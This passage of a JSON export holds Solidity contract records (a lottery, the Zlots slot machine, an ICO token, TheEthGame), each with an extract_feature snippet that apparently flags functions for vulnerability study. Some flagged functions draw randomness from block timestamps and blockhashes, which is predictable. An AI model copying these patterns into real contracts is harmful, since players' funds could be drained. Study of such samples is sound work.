finney){\n setConfig.singlePrice = _singlePrice * 1 finney;\n }\n }\n function startNewGame() private {\n gameIndex++;\n if(curConfig.hasChange) {\n if(curConfig.totalSize != setConfig.totalSize) {\n curConfig.totalSize = setConfig.totalSize;\n }\n if(curConfig.singlePrice != setConfig.singlePrice){\n curConfig.singlePrice = setConfig.singlePrice;\n }\n if( curConfig.pumpRate != setConfig.pumpRate) {\n curConfig.pumpRate = setConfig.pumpRate;\n }\n curConfig.hasChange = false;\n }\n addressArray.length=0;\n }\n function getGameInfo() public view returns (uint256,uint32,uint256,uint8,address[],uint256,bool) {\n return (gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n addressArray,\n totalPrice,\n isLock);\n }\n function gameResult() private {\n uint index = getRamdon();\n address lastAddress = addressArray[index];\n uint totalBalace = address(this).balance;\n uint giveToOwn = totalBalace * curConfig.pumpRate / 100;\n uint giveToActor = totalBalace - giveToOwn;\n owner.transfer(giveToOwn);\n lastAddress.transfer(giveToActor);\n emit gameOverEvent(\n gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n lastAddress,\n now);\n }\n function getRamdon() private view returns (uint) {\n bytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\n for(uint i = 0; i < addressArray.length; i++) {\n ramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n }\n uint index = uint(ramdon) % addressArray.length;\n return index;\n }\n function() notLock payable public{\n require(isNotContract(msg.sender),\"Contract not call addPlayer\");\n require(msg.value == curConfig.singlePrice,\"msg.value error\");\n totalPrice = totalPrice + msg.value;\n addressArray.push(msg.sender);\n emit addPlayerEvent(gameIndex,msg.sender);\n if(addressArray.length >= curConfig.totalSize) {\n gameResult();\n startNewGame();\n }\n }\n}",
  "extract_feature": [
    "function getRamdon() private view returns (uint) {\nbytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\nfor(uint i = 0; i < addressArray.length; i++) {\nramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n}\nuint index = uint(ramdon) % addressArray.length;\nreturn index;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b2c"
  },
  "filename": "1673.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zlots is ZTHReceivingContract {\n using SafeMath for uint;\n address private owner;\n address private bankroll;\n uint totalSpins;\n uint totalZTHWagered;\n uint contractBalance;\n bool public gameActive;\n address private ZTHTKNADDR;\n address private ZTHBANKROLL;\n ZTHInterface private ZTHTKN;\n mapping (uint => bool) validTokenBet;\n event HouseRetrievedTake(\n uint timeTaken,\n uint tokensWithdrawn\n );\n event TokensWagered(\n address _wagerer,\n uint _wagered\n );\n event LogResult(\n address _wagerer,\n uint _result,\n uint _profit,\n uint _wagered,\n uint _category,\n bool _win\n );\n event Loss(address _wagerer, uint _block);\n event ThreeMoonJackpot(address _wagerer, uint _block);\n event TwoMoonPrize(address _wagerer, uint _block);\n event ZTHJackpot(address _wagerer, uint _block);\n event ThreeZSymbols(address _wagerer, uint _block);\n event ThreeTSymbols(address _wagerer, uint _block);\n event ThreeHSymbols(address _wagerer, uint _block);\n event ThreeEtherIcons(address _wagerer, uint _block);\n event ThreeGreenPyramids(address _wagerer, uint _block);\n event ThreeGoldPyramids(address _wagerer, uint _block);\n event ThreeWhitePyramids(address _wagerer, uint _block);\n event OneMoonPrize(address _wagerer, uint _block);\n event OneOfEachPyramidPrize(address _wagerer, uint _block);\n event TwoZSymbols(address _wagerer, uint _block);\n event TwoTSymbols(address _wagerer, uint _block);\n event TwoHSymbols(address _wagerer, uint _block);\n event TwoEtherIcons(address _wagerer, uint _block);\n event TwoGreenPyramids(address _wagerer, uint _block);\n event TwoGoldPyramids(address _wagerer, uint _block);\n event TwoWhitePyramids(address _wagerer, uint _block);\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyBankroll {\n require(msg.sender == bankroll);\n _;\n }\n modifier onlyOwnerOrBankroll {\n require(msg.sender == owner || msg.sender == bankroll);\n _;\n }\n modifier gameIsActive {\n require(gameActive == true);\n _;\n }\n constructor(address ZethrAddress, address BankrollAddress) public {\n ZTHTKNADDR = ZethrAddress;\n ZTHBANKROLL = BankrollAddress;\n owner = msg.sender;\n bankroll = ZTHBANKROLL;\n ZTHTKN = ZTHInterface(ZTHTKNADDR);\n ZTHTKN.approve(ZTHBANKROLL, 2**256 - 1);\n ZTHTKN.approve(owner, 2**256 - 1);\n validTokenBet[5e18] = true;\n validTokenBet[10e18] = true;\n validTokenBet[25e18] = true;\n validTokenBet[50e18] = true;\n gameActive = true;\n }\n function() public payable { }\n struct TKN { address sender; uint value; }\n function tokenFallback(address _from, uint _value, bytes ) public returns (bool){\n if (_from == bankroll) {\n contractBalance = contractBalance.add(_value);\n return true;\n } else {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n _spinTokens(_tkn);\n return true;\n }\n }\n struct playerSpin {\n uint200 tokenValue;\n uint48 blockn;\n }\n mapping(address => playerSpin) public playerSpins;\n function _spinTokens(TKN _tkn) private {\n require(gameActive);\n require(_zthToken(msg.sender));\n require(validTokenBet[_tkn.value]);\n require(jackpotGuard(_tkn.value));\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n address _customerAddress = _tkn.sender;\n uint _wagered = _tkn.value;\n playerSpin memory spin = playerSpins[_tkn.sender];\n contractBalance = contractBalance.add(_wagered);\n require(block.number != spin.blockn);\n if (spin.blockn != 0) {\n _finishSpin(_tkn.sender);\n }\n spin.blockn = uint48(block.number);\n spin.tokenValue = uint200(_wagered);\n playerSpins[_tkn.sender] = spin;\n totalSpins += 1;\n totalZTHWagered += _wagered;\n emit TokensWagered(_customerAddress, _wagered);\n }\n function finishSpin() public\n gameIsActive\n returns (uint)\n {\n return _finishSpin(msg.sender);\n }\n function _finishSpin(address target)\n private returns (uint)\n {\n playerSpin memory spin = playerSpins[target];\n require(spin.tokenValue > 0);\n require(spin.blockn != block.number);\n uint profit = 0;\n uint category = 0;\n uint result;\n if (block.number - spin.blockn > 255) {\n result = 9999;\n } else {\n result = random(1000000, spin.blockn, target);\n }\n if (result > 476661) {\n emit Loss(target, spin.blockn);\n emit LogResult(target, result, profit, spin.tokenValue, category, false);\n } else\n if (result < 1) {\n profit = SafeMath.mul(spin.tokenValue, 500);\n category = 1;\n emit ThreeMoonJackpot(target, spin.blockn);\n } else\n if (result < 298) {\n profit = SafeMath.mul(spin.tokenValue, 232);\n category = 2;\n emit TwoMoonPrize(target, spin.blockn);\n } else\n if (result < 3127) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232), 10);\n category = 3;\n emit ZTHJackpot(target, spin.blockn);\n } else\n if (result < 5956) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 4;\n emit ThreeZSymbols(target, spin.blockn);\n } else\n if (result < 8785) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 5;\n emit ThreeTSymbols(target, spin.blockn);\n } else\n if (result < 11614) {\n profit = SafeMath.mul(spin.tokenValue, 25);\n category = 6;\n emit ThreeHSymbols(target, spin.blockn);\n } else\n if (result < 14443) {\n profit = SafeMath.mul(spin.tokenValue, 50);\n category = 7;\n emit ThreeEtherIcons(target, spin.blockn);\n } else\n if (result < 17272) {\n profit = SafeMath.mul(spin.tokenValue, 40);\n category = 8;\n emit ThreeGreenPyramids(target, spin.blockn);\n } else\n if (result < 20101) {\n profit = SafeMath.mul(spin.tokenValue, 20);\n category = 9;\n emit ThreeGoldPyramids(target, spin.blockn);\n } else\n if (result < 22929) {\n profit = SafeMath.mul(spin.tokenValue, 20);\n category = 10;\n emit ThreeWhitePyramids(target, spin.blockn);\n } else\n if (result < 52332) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 125),10);\n category = 11;\n emit OneMoonPrize(target, spin.blockn);\n } else\n if (result < 120225) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 15),10);\n category = 12;\n emit OneOfEachPyramidPrize(target, spin.blockn);\n } else\n if (result < 171146) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 13;\n emit TwoZSymbols(target, spin.blockn);\n } else\n if (result < 222067) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 14;\n emit TwoTSymbols(target, spin.blockn);\n } else\n if (result < 272988) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 232),100);\n category = 15;\n emit TwoHSymbols(target, spin.blockn);\n } else\n if (result < 323909) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 375),100);\n category = 16;\n emit TwoEtherIcons(target, spin.blockn);\n } else\n if (result < 374830) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 35),10);\n category = 17;\n emit TwoGreenPyramids(target, spin.blockn);\n } else\n if (result < 425751) {\n profit = SafeMath.div(SafeMath.mul(spin.tokenValue, 225),100);\n category = 18;\n emit TwoGoldPyramids(target, spin.blockn);\n } else {\n profit = SafeMath.mul(spin.tokenValue, 2);\n category = 19;\n emit TwoWhitePyramids(target, spin.blockn);\n }\n emit LogResult(target, result, profit, spin.tokenValue, category, true);\n contractBalance = contractBalance.sub(profit);\n ZTHTKN.transfer(target, profit);\n playerSpins[target] = playerSpin(uint200(0), uint48(0));\n return result;\n }\n function jackpotGuard(uint _wager)\n private\n view\n returns (bool)\n {\n uint maxProfit = SafeMath.mul(_wager, 500);\n uint ninetyContractBalance = SafeMath.mul(SafeMath.div(contractBalance, 10), 9);\n return (maxProfit <= ninetyContractBalance);\n }\n function maxRandom(uint blockn, address entropy) private view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function balanceOf() public view returns (uint) {\n return contractBalance;\n }\n function addNewBetAmount(uint _tokenAmount)\n public\n onlyOwner\n {\n validTokenBet[_tokenAmount] = true;\n }\n function pauseGame() public onlyOwner {\n gameActive = false;\n }\n function resumeGame() public onlyOwner {\n gameActive = true;\n }\n function changeOwner(address _newOwner) public onlyOwner {\n owner = _newOwner;\n }\n function changeBankroll(address _newBankroll) public onlyOwner {\n bankroll = _newBankroll;\n }\n function divertDividendsToBankroll()\n public\n onlyOwner\n {\n bankroll.transfer(address(this).balance);\n }\n function _zthToken(address _tokenContract) private view returns (bool) {\n return _tokenContract == ZTHTKNADDR;\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _spinTokens(TKN _tkn) private {\nrequire(gameActive);\nrequire(_zthToken(msg.sender));\nrequire(validTokenBet[_tkn.value]);\nrequire(jackpotGuard(_tkn.value));\nrequire(_tkn.value < ((2 ** 200) - 1));\nrequire(block.number < ((2 ** 48) - 1));\naddress _customerAddress = _tkn.sender;\nuint _wagered = _tkn.value;\nplayerSpin memory spin = playerSpins[_tkn.sender];\ncontractBalance = contractBalance.add(_wagered);\nrequire(block.number != spin.blockn);\nif (spin.blockn != 0) {\n_finishSpin(_tkn.sender);\n}\nspin.blockn = uint48(block.number);\nspin.tokenValue = uint200(_wagered);\nplayerSpins[_tkn.sender] = spin;\ntotalSpins += 1;\ntotalZTHWagered += _wagered;\nemit TokensWagered(_customerAddress, _wagered);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b2d"
  },
  "filename": "1698.sol",
  "content": "pragma solidity ^0.4.12;\ncontract IMigrationContract {\n function migrate(address addr, uint256 nas) returns (bool success);\n}\ncontract SafeMath {\n function safeAdd(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x + y;\n assert((z >= x) && (z >= y));\n return z;\n }\n function safeSubtract(uint256 x, uint256 y) internal returns(uint256) {\n assert(x >= y);\n uint256 z = x - y;\n return z;\n }\n function safeMult(uint256 x, uint256 y) internal returns(uint256) {\n uint256 z = x * y;\n assert((x == 0)||(z/x == y));\n return z;\n }\n}\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n}\ncontract EVTCToken is StandardToken, SafeMath {\n string public constant name = \"EVTC\";\n string public constant symbol = \"ECoin\";\n uint256 public constant decimals = 18;\n string public version = \"1.0\";\n address public ethFundDeposit;\n address public newContractAddr;\n bool public isFunding;\n uint256 public fundingStartBlock;\n uint256 public fundingStopBlock;\n uint256 public currentSupply;\n uint256 public tokenRaised = 0;\n uint256 public tokenMigrated = 0;\n uint256 public tokenExchangeRate = 625;\n event AllocateToken(address indexed _to, uint256 _value);\n event IssueToken(address indexed _to, uint256 _value);\n event IncreaseSupply(uint256 _value);\n event DecreaseSupply(uint256 _value);\n event Migrate(address indexed _to, uint256 _value);\n function formatDecimals(uint256 _value) internal returns (uint256 ) {\n return _value * 10 ** decimals;\n }\n function EVTCToken(\n address _ethFundDeposit,\n uint256 _currentSupply)\n {\n ethFundDeposit = _ethFundDeposit;\n isFunding = false;\n fundingStartBlock = 0;\n fundingStopBlock = 0;\n currentSupply = formatDecimals(_currentSupply);\n totalSupply = formatDecimals(100000000);\n balances[msg.sender] = totalSupply;\n if(currentSupply > totalSupply) throw;\n }\n modifier isOwner() { require(msg.sender == ethFundDeposit); _; }\n function setTokenExchangeRate(uint256 _tokenExchangeRate) isOwner external {\n if (_tokenExchangeRate == 0) throw;\n if (_tokenExchangeRate == tokenExchangeRate) throw;\n tokenExchangeRate = _tokenExchangeRate;\n }\n function increaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + currentSupply > totalSupply) throw;\n currentSupply = safeAdd(currentSupply, value);\n IncreaseSupply(value);\n }\n function decreaseSupply (uint256 _value) isOwner external {\n uint256 value = formatDecimals(_value);\n if (value + tokenRaised > currentSupply) throw;\n currentSupply = safeSubtract(currentSupply, value);\n DecreaseSupply(value);\n }\n function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\n if (isFunding) throw;\n if (_fundingStartBlock >= _fundingStopBlock) throw;\n if (block.number >= _fundingStartBlock) throw;\n fundingStartBlock = _fundingStartBlock;\n fundingStopBlock = _fundingStopBlock;\n isFunding = true;\n }\n function stopFunding() isOwner external {\n if (!isFunding) throw;\n isFunding = false;\n }\n function setMigrateContract(address _newContractAddr) isOwner external {\n if (_newContractAddr == newContractAddr) throw;\n newContractAddr = _newContractAddr;\n }\n function changeOwner(address _newFundDeposit) isOwner() external {\n if (_newFundDeposit == address(0x0)) throw;\n ethFundDeposit = _newFundDeposit;\n }\n function migrate() external {\n if(isFunding) throw;\n if(newContractAddr == address(0x0)) throw;\n uint256 tokens = balances[msg.sender];\n if (tokens == 0) throw;\n balances[msg.sender] = 0;\n tokenMigrated = safeAdd(tokenMigrated, tokens);\n IMigrationContract newContract = IMigrationContract(newContractAddr);\n if (!newContract.migrate(msg.sender, tokens)) throw;\n Migrate(msg.sender, tokens);\n }\n function transferETH() isOwner external {\n if (this.balance == 0) throw;\n if (!ethFundDeposit.send(this.balance)) throw;\n }\n function allocateToken (address _addr, uint256 _eth) isOwner external {\n if (_eth == 0) throw;\n if (_addr == address(0x0)) throw;\n uint256 tokens = safeMult(formatDecimals(_eth), tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[_addr] += tokens;\n AllocateToken(_addr, tokens);\n }\n function () payable {\n if (!isFunding) throw;\n if (msg.value == 0) throw;\n if (block.number < fundingStartBlock) throw;\n if (block.number > fundingStopBlock) throw;\n uint256 tokens = safeMult(msg.value, tokenExchangeRate);\n if (tokens + tokenRaised > currentSupply) throw;\n tokenRaised = safeAdd(tokenRaised, tokens);\n balances[msg.sender] += tokens;\n IssueToken(msg.sender, tokens);\n }\n}",
  "extract_feature": [
    "function startFunding (uint256 _fundingStartBlock, uint256 _fundingStopBlock) isOwner external {\nif (isFunding) throw;\nif (_fundingStartBlock >= _fundingStopBlock) throw;\nif (block.number >= _fundingStartBlock) throw;\nfundingStartBlock = _fundingStartBlock;\nfundingStopBlock = _fundingStopBlock;\nisFunding = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b2e"
  },
  "filename": "1700.sol",
  "content": "contract TheEthGameTrophy {\n string public name;\n string public description;\n string public message;\n address public creator;\n address public owner;\n address public winner;\n uint public rank;\n bool private isAwarded = false;\n event Award(uint256 indexed _blockNumber, uint256 indexed _timestamp, address indexed _owner);\n event Transfer (address indexed _from, address indexed _to);\n constructor () public {\n name = \"The Eth Game Winner\";\n description = \"2019-08-17\";\n rank = 1;\n creator = msg.sender;\n }\n function name() constant public returns (string _name) {\n return name;\n }\n function description() constant public returns (string _description) {\n return description;\n }\n function message() constant public returns (string _message) {\n return message;\n }\n function creator() constant public returns (address _creator) {\n return creator;\n }\n function owner() constant public returns (address _owner) {\n return owner;\n }\n function winner() constant public returns (address _winner) {\n return winner;\n }\n function rank() constant public returns (uint _rank) {\n return rank;\n }\n function award(address _address, string _message) public {\n require(msg.sender == creator && !isAwarded);\n isAwarded = true;\n owner = _address;\n winner = _address;\n message = _message;\n emit Award(block.number, block.timestamp, _address);\n }\n function transfer(address _to) private returns (bool success) {\n require(msg.sender == owner);\n owner = _to;\n emit Transfer(msg.sender, _to);\n return true;\n }\n}",
  "extract_feature": [
    "function award(address _address, string _message) public {\nrequire(msg.sender == creator && !isAwarded);\nisAwarded = true;\nowner = _address;\nwinner = _address;\nmessage = _message;\nemit Award(block.number, block.timestamp, _address);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b2f"
  },
  "filename": "1701.sol",
  "content": "pragma solidity ^0.4.13;\nlibrary SafeMath {\n function mul(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n if (_a == 0) {\n return 0;\n }\n c = _a * _b;\n assert(c / _a == _b);\n return c;\n }\n function div(uint256 _a, uint256 _b) internal pure returns (uint256) {\n return _a / _b;\n }\n function sub(uint256 _a, uint256 _b) internal pure returns (uint256) {\n assert(_b <= _a);\n return _a - _b;\n }\n function add(uint256 _a, uint256 _b) internal pure returns (uint256 c) {\n c = _a + _b;\n assert(c >= _a);\n return c;\n }\n}\ncontract TheEthGame {\n using SafeMath for uint256;\n struct Player {\n uint256 score;\n uint256 lastCellBoughtOnBlockNumber;\n uint256 numberOfCellsOwned;\n uint256 numberOfCellsBought;\n uint256 earnings;\n uint256 partialHarmonicSum;\n uint256 partialScoreSum;\n address referreal;\n bytes32 name;\n }\n struct Cell {\n address owner;\n uint256 price;\n }\n address public owner;\n uint256 constant private NUMBER_OF_LINES = 6;\n uint256 constant private NUMBER_OF_COLUMNS = 6;\n uint256 constant private NUMBER_OF_CELLS = NUMBER_OF_COLUMNS * NUMBER_OF_LINES;\n uint256 constant private DEFAULT_POINTS_PER_CELL = 3;\n uint256 constant private POINTS_PER_NEIGHBOUR = 1;\n uint256 constant private CELL_STARTING_PRICE = 0.002 ether;\n uint256 constant private BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME = 10000;\n uint256 constant private PRICE_INCREASE_PERCENTAGE = uint(2);\n uint256 constant private REFERREAL_PERCENTAGE = uint(10);\n uint256 constant private POT_PERCENTAGE = uint(30);\n uint256 constant private DEVELOPER_PERCENTAGE = uint(5);\n uint256 constant private SCORE_PERCENTAGE = uint(25);\n uint256 constant private NUMBER_OF_CELLS_PERCENTAGE = uint(30);\n Cell[NUMBER_OF_CELLS] cells;\n address[] private ranking;\n mapping(address => Player) players;\n mapping(bytes32 => address) nameToAddress;\n uint256 public numberOfCellsBought;\n uint256 private totalScore;\n uint256 private developersCut = 0 ether;\n uint256 private potCut = 0 ether;\n uint256 private harmonicSum;\n uint256 private totalScoreSum;\n address private rankOnePlayerAddress;\n uint256 private isFirstSinceBlock;\n address public trophyAddress;\n event Bought (address indexed _from, address indexed _to);\n constructor () public {\n owner = msg.sender;\n trophyAddress = new TheEthGameTrophy();\n }\n modifier onlyOwner() {\n require(owner == msg.sender);\n _;\n }\n function nextPriceOf (uint256 _cellId) public view returns (uint256 _nextPrice) {\n return priceOf(_cellId).mul(100 + PRICE_INCREASE_PERCENTAGE) / 100;\n }\n function priceOf (uint256 _cellId) public view returns (uint256 _price) {\n if (cells[_cellId].price == 0) {\n return CELL_STARTING_PRICE;\n }\n return cells[_cellId].price;\n }\n function earningsFromNumberOfCells (address _address) internal view returns (uint256 _earnings) {\n return harmonicSum.sub(players[_address].partialHarmonicSum).mul(players[_address].numberOfCellsBought);\n }\n function distributeEarningsBasedOnNumberOfCells (address _address) internal {\n players[_address].earnings = players[_address].earnings.add(earningsFromNumberOfCells(_address));\n players[_address].partialHarmonicSum = harmonicSum;\n }\n function earningsFromScore (address _address) internal view returns (uint256 _earnings) {\n return totalScoreSum.sub(players[_address].partialScoreSum).mul(scoreOf(_address));\n }\n function distributeEarningsBasedOnScore (address _newOwner, address _oldOwner) internal {\n players[_newOwner].earnings = players[_newOwner].earnings.add(earningsFromScore(_newOwner));\n players[_newOwner].partialScoreSum = totalScoreSum;\n if (_oldOwner != address(0)) {\n players[_oldOwner].earnings = players[_oldOwner].earnings.add(earningsFromScore(_oldOwner));\n players[_oldOwner].partialScoreSum = totalScoreSum;\n }\n }\n function earningsOfPlayer () public view returns (uint256 _wei) {\n return players[msg.sender].earnings.add(earningsFromScore(msg.sender)).add(earningsFromNumberOfCells(msg.sender));\n }\n function getRankOnePlayer (address _oldOwner) internal view returns (address _address, uint256 _oldOwnerIndex) {\n address rankOnePlayer;\n uint256 oldOwnerIndex;\n for (uint256 i = 0; i < ranking.length; i++) {\n if (scoreOf(ranking[i]) > scoreOf(rankOnePlayer)) {\n rankOnePlayer = ranking[i];\n } else if (scoreOf(ranking[i]) == scoreOf(rankOnePlayer) && players[ranking[i]].lastCellBoughtOnBlockNumber > players[rankOnePlayer].lastCellBoughtOnBlockNumber) {\n rankOnePlayer = ranking[i];\n }\n if (ranking[i] == _oldOwner) {\n oldOwnerIndex = i;\n }\n }\n return (rankOnePlayer, oldOwnerIndex);\n }\n function buy (uint256 _cellId, address _referreal) payable public {\n require(msg.value >= priceOf(_cellId));\n require(!isContract(msg.sender));\n require(_cellId < NUMBER_OF_CELLS);\n require(msg.sender != address(0));\n require(!isGameFinished());\n require(ownerOf(_cellId) != msg.sender);\n require(msg.sender != _referreal);\n address oldOwner = ownerOf(_cellId);\n address newOwner = msg.sender;\n uint256 price = priceOf(_cellId);\n uint256 excess = msg.value.sub(price);\n bool isReferrealDistributed = distributeToReferreal(price, _referreal);\n if (numberOfCellsBought > 0) {\n harmonicSum = harmonicSum.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE) / (numberOfCellsBought * 100));\n if (isReferrealDistributed) {\n totalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE) / (totalScore * 100));\n } else {\n totalScoreSum = totalScoreSum.add(price.mul(SCORE_PERCENTAGE.add(REFERREAL_PERCENTAGE)) / (totalScore * 100));\n }\n }else{\n potCut = potCut.add(price.mul(NUMBER_OF_CELLS_PERCENTAGE.add(SCORE_PERCENTAGE)) / 100);\n }\n numberOfCellsBought++;\n distributeEarningsBasedOnNumberOfCells(newOwner);\n players[newOwner].numberOfCellsBought++;\n players[newOwner].numberOfCellsOwned++;\n if (ownerOf(_cellId) != address(0)) {\n players[oldOwner].numberOfCellsOwned--;\n }\n players[newOwner].lastCellBoughtOnBlockNumber = block.number;\n address oldRankOnePlayer = rankOnePlayerAddress;\n (uint256 newOwnerScore, uint256 oldOwnerScore) = calculateScoresIfCellIsBought(newOwner, oldOwner, _cellId);\n distributeEarningsBasedOnScore(newOwner, oldOwner);\n totalScore = totalScore.sub(scoreOf(newOwner).add(scoreOf(oldOwner)));\n players[newOwner].score = newOwnerScore;\n players[oldOwner].score = oldOwnerScore;\n totalScore = totalScore.add(scoreOf(newOwner).add(scoreOf(oldOwner)));\n cells[_cellId].price = nextPriceOf(_cellId);\n if (players[newOwner].numberOfCellsOwned == 1) {\n ranking.push(newOwner);\n }\n if (oldOwner == rankOnePlayerAddress || (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0))) {\n (address rankOnePlayer, uint256 oldOwnerIndex) = getRankOnePlayer(oldOwner);\n if (players[oldOwner].numberOfCellsOwned == 0 && oldOwner != address(0)) {\n delete ranking[oldOwnerIndex];\n }\n rankOnePlayerAddress = rankOnePlayer;\n }else{\n if (scoreOf(newOwner) >= scoreOf(rankOnePlayerAddress)) {\n rankOnePlayerAddress = newOwner;\n }\n }\n if (rankOnePlayerAddress != oldRankOnePlayer) {\n isFirstSinceBlock = block.number;\n }\n developersCut = developersCut.add(price.mul(DEVELOPER_PERCENTAGE) / 100);\n potCut = potCut.add(price.mul(POT_PERCENTAGE) / 100);\n _transfer(oldOwner, newOwner, _cellId);\n emit Bought(oldOwner, newOwner);\n if (excess > 0) {\n newOwner.transfer(excess);\n }\n }\n function distributeToReferreal (uint256 _price, address _referreal) internal returns (bool _isDstributed) {\n if (_referreal != address(0) && _referreal != msg.sender) {\n players[msg.sender].referreal = _referreal;\n }\n if (players[msg.sender].referreal != address(0)) {\n address ref = players[msg.sender].referreal;\n players[ref].earnings = players[ref].earnings.add(_price.mul(REFERREAL_PERCENTAGE) / 100);\n return true;\n }\n return false;\n }\n function getPlayers () external view returns(uint256[] _scores, uint256[] _lastCellBoughtOnBlock, address[] _addresses, bytes32[] _names) {\n uint256[] memory scores = new uint256[](ranking.length);\n address[] memory addresses = new address[](ranking.length);\n uint256[] memory lastCellBoughtOnBlock = new uint256[](ranking.length);\n bytes32[] memory names = new bytes32[](ranking.length);\n for (uint256 i = 0; i < ranking.length; i++) {\n Player memory p = players[ranking[i]];\n scores[i] = p.score;\n addresses[i] = ranking[i];\n lastCellBoughtOnBlock[i] = p.lastCellBoughtOnBlockNumber;\n names[i] = p.name;\n }\n return (scores, lastCellBoughtOnBlock, addresses, names);\n }\n function getCells () external view returns (uint256[] _prices, uint256[] _nextPrice, address[] _owner, bytes32[] _names) {\n uint256[] memory prices = new uint256[](NUMBER_OF_CELLS);\n address[] memory owners = new address[](NUMBER_OF_CELLS);\n bytes32[] memory names = new bytes32[](NUMBER_OF_CELLS);\n uint256[] memory nextPrices = new uint256[](NUMBER_OF_CELLS);\n for (uint256 i = 0; i < NUMBER_OF_CELLS; i++) {\n prices[i] = priceOf(i);\n owners[i] = ownerOf(i);\n names[i] = players[ownerOf(i)].name;\n nextPrices[i] = nextPriceOf(i);\n }\n return (prices, nextPrices, owners, names);\n }\n function getPlayer () external view returns (bytes32 _name, uint256 _score, uint256 _earnings, uint256 _numberOfCellsBought) {\n return (players[msg.sender].name, players[msg.sender].score, earningsOfPlayer(), players[msg.sender].numberOfCellsBought);\n }\n function getCurrentPotSize () public view returns (uint256 _wei) {\n return potCut;\n }\n function getCurrentWinner () public view returns (address _address) {\n return rankOnePlayerAddress;\n }\n function getNumberOfBlocksRemainingToWin () public view returns (int256 _numberOfBlocks) {\n return int256(BLOCKS_TO_CONFIRM_TO_WIN_THE_GAME) - int256(block.number.sub(isFirstSinceBlock));\n }\n function scoreOf (address _address) public view returns (uint256 _score) {\n return players[_address].score;\n }\n function ownerOf (uint256 _cellId) public view returns (address _owner) {\n return cells[_cellId].owner;\n }\n function isGameFinished() public view returns (bool _isGameFinished) {\n return rankOnePlayerAddress != address(0) && getNumberOfBlocksRemainingToWin() < 0;\n }\n function calculateScoresIfCellIsBought (address _newOwner, address _oldOwner, uint256 _cellId) internal view returns (uint256 _newOwnerScore, uint256 _oldOwnerScore) {\n uint256 oldOwnerScoreAdjustment = DEFAULT_POINTS_PER_CELL;\n uint256 